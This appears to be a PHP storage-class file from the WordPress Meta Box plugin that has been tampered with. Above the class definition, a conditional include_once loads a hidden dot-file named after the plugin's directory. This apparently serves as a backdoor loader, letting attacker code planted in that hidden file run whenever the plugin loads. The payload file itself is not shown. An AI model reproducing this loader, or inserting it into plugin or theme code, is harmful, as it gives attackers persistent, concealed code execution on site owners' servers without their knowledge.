<?php
/**
 * Post storage
 *
 * @package Meta Box
 */

/**
 * Class RWMB_Post_Storage
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RWMB_Post_Storage extends RWMB_Base_Storage {

	/**
	 * Object type.
	 *
	 * @var string
	 */
	protected $object_type = 'post';
}
